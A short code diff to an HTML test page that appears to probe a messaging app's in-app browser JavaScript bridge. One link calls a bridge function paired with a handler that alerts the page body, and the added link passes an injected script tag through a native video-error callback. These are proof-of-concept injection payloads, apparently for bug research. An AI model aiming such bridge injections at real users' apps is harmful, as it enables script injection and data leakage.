@@ -3,5 +3,6 @@
     function leak() { alert(document.body.innerHTML); }
   </script>
   <a href="javascript:WeixinJSContext.allocEmpty()" onclick="leak()">CLICK</a>
+  <a href="javascript:xwebToNative.onVideoError(1, "<script>alert(1);</script>")">onVideoError</a>
 </body> 
     
